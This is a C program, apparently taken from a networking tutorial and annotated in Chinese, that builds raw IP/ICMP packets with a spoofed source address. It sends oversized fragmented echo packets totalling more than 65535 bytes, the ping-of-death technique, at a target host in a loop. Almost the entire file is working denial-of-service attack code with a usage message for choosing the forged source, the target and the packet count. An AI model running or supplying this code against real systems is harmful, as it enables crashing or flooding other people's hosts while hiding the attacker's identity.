/*source: http://www.tenouk.com/Module43a.html*/


#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>                    //for gethostbyname()
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>
 
#define Server_PortNumber 5555

int main(int argc, char *argv[])
{
    int s, i;
    char buf[400];
    struct ip *ip = (struct ip *)buf;       //將buf轉為ip的格式、ip的header長度為20Bytes
    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);      //移動1個Byte，將指標只到IMCP message的頭，代表指向ICMP的起始位址
    struct hostent *hp, *hp2;               //for gethostbyname()
    struct sockaddr_in dst;     //指定目的地位址
    int offset;
    int on;
    int num = 100;
 
    if(argc < 3)
    {
        printf("\nUsage: %s <saddress> <dstaddress> [number]\n", argv[0]);
        printf("- saddress is the spoofed source address\n");
        printf("- dstaddress is the target\n");
        printf("- number is the number of packets to send, 100 is the default\n");
        exit(1);
    }
 
    /* If enough argument supplied */
    if(argc == 4)
    {
        /* Copy the packet number */
        num = atoi(argv[3]);
    }
        
 
    /* Loop based on the packet number */
    for(i=1;i<=num;i++)
    {
        printf("---------------\n");
        printf("Send packet's number: %d\n",i);
        bzero(buf, sizeof(buf));
 
        /* Create RAW socket */
        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        {
            perror("socket() error");
            /* If something wrong, just exit */
            exit(1);
        }
        
        on = 1;                     //an nonzero value used to turn the options on
        /* socket options, tell the kernel we provide the IP structure */
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
        {
            perror("setsockopt() for IP_HDRINCL error");
            exit(1);
        }
 
        if((hp = gethostbyname(argv[2])) == NULL)
        {
            if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1)
            {
                fprintf(stderr, "%s: Can't resolve, unknown host.\n", argv[2]);
                exit(1);
            }
        }
        else
        {
            // copy dst address to 「ip_dst.s_addr」
            /*一般主機可以有多個ip地址，例如www.163.com就有121.11.151.72和121.14.228.43兩個ip地址，h_addr_list就用來保存多個ip地址*/
            bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
        }
 
        /* The following source address just redundant for target to collect */
        if((hp2 = gethostbyname(argv[1])) == NULL)
        {
            if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1)
            {
                fprintf(stderr, "%s: Can't resolve, unknown host\n", argv[1]);
                exit(1);
            }
        }
        else
        {
            // copy src address to 「ip_dst.s_addr」
            bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
        }
 
        printf("Sending to %s from spoofed %s\n", inet_ntoa(ip->ip_dst), argv[1]);
 
        /* Ip structure, check the ip.h */
        ip->ip_v = 4;
        ip->ip_hl = sizeof*ip >> 2;     // =5 (5*4=20Bytes，IP header 的長度)
        ip->ip_tos = 0;                         //type of service  0 = normal
        ip->ip_len = htons(sizeof(buf));        //total length
        ip->ip_id = htons(4321);                //identification
        ip->ip_off = htons(0);                  //fragment offset
        ip->ip_ttl = 255;                       //time to live
        ip->ip_p = 1;                           //protocol 1=ICMPv4        
        ip->ip_sum = 0; /* Let kernel fills in */
        
        dst.sin_family = AF_INET; 
        // dst.sin_port = htons(Server_PortNumber);
        dst.sin_addr = ip->ip_dst;


        icmp->type = ICMP_ECHO;     /* 8， Echo Request*/
        icmp->code = 0;
        /* Header checksum */
        icmp->checksum = htons(~(ICMP_ECHO << 8));
 
        // printf("sizeof buf: %d\n", sizeof(buf));                 //400 byte
        // printf("sizeof ip: %d\n", sizeof(*ip));                  //20 byte
        for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip)))
        {
            char message[6] = "hello\0";
            // printf("offset: %d\n", offset);
            ip->ip_off = htons(offset >> 3);
 
            if(offset < 65120)
            {
                ip->ip_off |= htons(0x2000);
            }
            else
            {
                ip->ip_len = htons(418); /* make total 65538 */
            }
 
            /* sending time */
            if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
            {
               fprintf(stderr, "offset %d: ", offset);
               perror("sendto() error");
            }
            else
            {   
                // printf("message: %s\n", message);
                printf("sendto() is OK.\n");
            }
 
            /* IF offset = 0, define our ICMP structure */
            if(offset == 0)
            {
                icmp->type = 0;                 // Echo reply
                icmp->code = 0;
                icmp->checksum = 0;
            }
        }
        
        /* close socket */
        close(s);
        usleep(30000);
    }
    return 0;
}
